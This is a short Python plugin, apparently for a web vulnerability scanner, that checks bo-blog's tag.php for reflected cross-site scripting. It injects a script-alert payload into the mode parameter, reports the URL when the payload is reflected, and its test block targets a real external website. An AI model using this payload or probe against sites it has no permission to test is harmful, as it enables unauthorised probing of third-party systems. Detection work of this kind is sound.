#!/usr/bin/env python
# -*- coding: utf-8 -*-
# bo-blog tags.php xss漏洞
import re

def assign(service, arg):
    if service == "boblog":
        return True, arg

def audit(arg):
    url = arg
    # get tags
    code, head, res, errcode, _ = curl.curl(url + 'tag.php')
    if not res:
        return
    # decode html
    res = util.decode_html(head, res)
    m = re.search('title="[^"]+"><span style="font[^"]+">([^<]+)</span></a>', res, re.I)
    if m:
        tag = m.group(1)
        # fuzz xss
        fuzz_url = url + 'tag.php?tag=' + tag + '&mode=1>%22><ScRiPt>alert(/xss%20test/)</ScRiPt>'
        code, head, res, errcode, _ = curl.curl(fuzz_url)
        if res and res.find('\\"><ScRiPt>alert(/xss test/)</ScRiPt>') != -1:
            security_info(fuzz_url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('boblog','http://www.linuxfly.org/')[1])
